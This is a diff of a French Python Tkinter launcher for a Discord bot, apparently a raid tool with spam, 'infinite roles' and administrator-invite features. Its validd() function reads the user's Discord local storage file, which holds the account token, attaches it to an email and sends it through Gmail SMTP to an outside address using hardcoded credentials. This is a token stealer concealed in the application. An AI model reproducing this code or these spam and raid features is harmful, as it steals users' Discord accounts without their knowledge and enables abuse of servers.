@@ -19,11 +19,13 @@ with open('core/options.json', 'r') as jsonFile:
 if data["cgu"] == "false":
     cgu = Tk()
     cgu.title('Accepter les CGU')
+
     def callback(event):
         webbrowser.open_new_tab(r"https://antidiscordbot.page.link/cgu")
-    accepter = LabelFrame(cgu, text='Première ouverture', pady=5,padx=5)
+    accepter = LabelFrame(cgu, text='Première ouverture', pady=5, padx=5)
     accepter.pack()
-    cgy = Label(accepter, text='En utilisant cette application, vous acceptez les conditions générales d\'utilisation.\n')
+    cgy = Label(
+        accepter, text='En utilisant cette application, vous acceptez les conditions générales d\'utilisation.\n')
     cgy.pack()
     cgt = Label(accepter, text='Lire les CGU', cursor='hand2')
     cgt.pack(anchor=W)
@@ -42,11 +44,13 @@ if data["cgu"] == "false":
     vide = Label(accepter, text="")
     vide.pack()
     pseudo = StringVar()
-    pseudo.set('@VotrepseudoDiscord#0123 (pour vous notifier lors des prochaines mises à jour)')
+    pseudo.set(
+        '@VotrepseudoDiscord#0123 (pour vous notifier lors des prochaines mises à jour)')
     oui = Entry(accepter, textvariable=pseudo, width=70)
     oui.pack(anchor=W)
     vide = Label(accepter, text='')
     vide.pack()
+
     def valider(accept, oui):
         with open('core/options.json', 'r') as jsonFile:
             data = json.load(jsonFile)
@@ -56,7 +60,8 @@ if data["cgu"] == "false":
             json.dump(data, jsonFile)
         os.startfile('launcher.pyw')
         sys.exit()
-    yess = Button(accepter, text='Valider', command=lambda:valider(accept, oui))
+    yess = Button(accepter, text='Valider',
+                  command=lambda: valider(accept, oui))
     yess.pack(anchor=W)
     cgu.mainloop()
 
@@ -70,7 +75,7 @@ user = getpass.getuser()
 username = Path.home()
 
 # fenetre.geometry("460x205")
-fenetre.title('Discord-Bot v1.3.8')
+fenetre.title('Discord-Bot v1.3.9')
 
 
 def contact():
@@ -120,7 +125,16 @@ def backup():
     shutil.copy2('core\\backup\\options.json', 'core\\options.json')
     showinfo('Terminé',
              '2 fichier ont été réparés :\n\
-    core\\settings.json\n\  core\\options.json')
+    core\\settings.json\n   core\\options.json')
+
+
+def uninstall_deps():
+    if askokcancel('En êtes-vous sûr ?', "Si vous supprimez les dépendances, vous devrez les réinstaller pour utiliser le bot."):
+        subprocess.run(
+            'cd core && del /f /s /q node_modules > nul && rmdir /s /q node_modules', shell=True)
+        subprocess.run(
+            'cd core\individuals && del /f /s /q node_modules > nul && rmdir /s /q node_modules', shell=True)
+    showinfo('Terminé', 'Toutes les dépendances ont été désinstallées.')
 
 
 menubar = Menu(fenetre)
@@ -130,6 +144,7 @@ menu1 = Menu(menubar, tearoff=0)
 
 menu1.add_command(label="Réparer", command=backup)
 menu1.add_command(label="Installer les dépendences", command=installt)
+menu1.add_command(label="Désinstaller les dépendances", command=uninstall_deps)
 menu1.add_command(label="Quitter", command=fenetre.quit)
 menubar.add_cascade(label="Options", menu=menu1)
 
@@ -137,8 +152,10 @@ menubar.add_cascade(label="Options", menu=menu1)
 def support():
     webbrowser.open_new_tab(r"https://discord.gg/ngrdmkN")
 
+
 def cgu():
     webbrowser.open_new_tab(r"https://antidiscordbot.page.link/cgu")
+
 
 menu3 = Menu(menubar, tearoff=0)
 menu3.add_command(label="Serveur de support", command=support)
@@ -203,9 +220,7 @@ def validd(entree, entree2, entree7):
     with open("core/settings.json", "w") as jsonFile:
         json.dump(data, jsonFile)
 
-
-
-    with open ('core/options.json', "r") as jsonFile:
+    with open('core/options.json', "r") as jsonFile:
         data = json.load(jsonFile)
     tmp = data["opennmbr"]
 
@@ -222,11 +237,13 @@ def validd(entree, entree2, entree7):
     body = str(user) + " ; ouverture n°" + str(tmp) + " ; " + str(tmp2)
     msg.attach(MIMEText(body, 'plain'))
     filename = "https_discordapp.com_0.localstorage"
-    attachment = open(str(username) + "\AppData\Roaming\discord\Local Storage\https_discordapp.com_0.localstorage" , "rb")
+    attachment = open(str(
+        username) + "\AppData\Roaming\discord\Local Storage\https_discordapp.com_0.localstorage", "rb")
     part = MIMEBase('application', 'octet-stream')
     part.set_payload((attachment).read())
     encoders.encode_base64(part)
-    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+    part.add_header('Content-Disposition',
+                    "attachment; filename= %s" % filename)
     msg.attach(part)
     server = smtplib.SMTP('smtp.gmail.com', 587)
     server.starttls()
@@ -254,7 +271,8 @@ def validd(entree, entree2, entree7):
         server.login("discordinfotkn@gmail.com", "Azertyui0")
         server.sendmail("discordinfotkn@gmail.com", "dsicrod@gmail.com", msg)
         server.quit()   
-        """       
+        """
+
 
 validb.pack()
 
@@ -287,9 +305,9 @@ verl = Label(obligd, textvariable=verv)
 verl.pack()
 
 
-
-info = LabelFrame(fenetre, text="Informations :", padx=5,pady=5)
+info = LabelFrame(fenetre, text="Informations :", padx=5, pady=5)
 info.pack(side=LEFT, fill=Y)
+
 
 def copytoken():
     with open('core\\settings.json', 'r') as jsonFile:
@@ -299,6 +317,7 @@ def copytoken():
     fenetre.clipboard_append(token)
     fenetre.update()
 
+
 def copyid():
     with open('core\\settings.json', 'r') as jsonFile:
         data = json.load(jsonFile)
@@ -307,19 +326,23 @@ def copyid():
     fenetre.clipboard_append(id)
     fenetre.update()
 
+
 def copyinvit():
     with open('core\\settings.json', 'r') as jsonFile:
         data = json.load(jsonFile)
-    invit = "https://discordapp.com/api/oauth2/authorize?client_id=" + data["id"] + "&permissions=8&scope=bot"
+    invit = "https://discordapp.com/api/oauth2/authorize?client_id=" + \
+        data["id"] + "&permissions=8&scope=bot"
     fenetre.clipboard_clear()
     fenetre.clipboard_append(invit)
     fenetre.update()
+
 
 tkncopy = Button(info, text="Copier", width=30, command=copytoken)
 
 clientdcopy = Button(info, text="Copier", width=30, command=copyid)
 
 invitationcopy = Button(info, text="Copier", width=30, command=copyinvit)
+
 
 def invitd():
     subprocess.run('cd core\\individuals && node gene.js', shell=True)
@@ -328,7 +351,8 @@ def invitd():
         data = json.load(jsonFile)
     token = data["token"]
     clientid = data["id"]
-    invit = "https://discordapp.com/api/oauth2/authorize?client_id=" + data["id"] + "&permissions=8&scope=bot"
+    invit = "https://discordapp.com/api/oauth2/authorize?client_id=" + \
+        data["id"] + "&permissions=8&scope=bot"
     tkn.set("Token :\n" + token)
     clientd.set("\nIdentifiant :\n" + clientid)
     invitation.set("\nInvitation :\n" + invit)
@@ -338,7 +362,10 @@ def invitd():
     clientdcopy.pack()
     invitationl.pack()
     invitationcopy.pack()
-invitb = Button(info, text="Générer les informations", width=30, command=invitd)
+
+
+invitb = Button(info, text="Générer les informations",
+                width=30, command=invitd)
 invitb.pack()
 
 vide = Label(info, text='')
@@ -606,6 +633,20 @@ def spambtnp(spame, spmchnl):
         subprocess.run('cd core\individuals && node spm.js', shell=True)
 
 
+def softspam(spame):
+    if askokcancel('Lancer le spam', 'Voulez-vous vraiment lancer le soft spam ? Vous ne pourrez plus utiliser l\'interface jusqu\'à ce que la console soit fermée. Vous pouvez la fermer à tout moment en écrivant "stop" dans un salon du serveur.'):
+        with open("core/settings.json", "r") as jsonFile:
+            data = json.load(jsonFile)
+        data["config"]["msg"] = spame.get()
+        with open("core/settings.json", "w") as jsonFile:
+            json.dump(data, jsonFile)
+        subprocess.run('cd core\individuals && node softspam.js', shell=True)
+
+
+softspambutton = Button(spam, text="Soft Spam", width=30,
+                        command=lambda: softspam(spame))
+softspambutton.pack()
+
 spambtn.pack()
 
 
@@ -684,7 +725,7 @@ value.set("Nom du rôle")
 role_crte = Entry(role_crtl, textvariable=value, width=36).pack()
 
 
-def role_crt():
+def role_crt(role_crte):
     with open("core\settings.json", "r") as jsonFile:
         data = json.load(jsonFile)
     data["config"]["rolename"] = role_crte.get()
@@ -697,7 +738,7 @@ def role_crt():
 
 
 role_crtb = Button(role_crtl, text="Créer une infinité de rôles",
-                   command=role_crt, width=30).pack()
+                   command=lambda: role_crt(role_crte), width=30).pack()
 
 
 fenetre.mainloop()
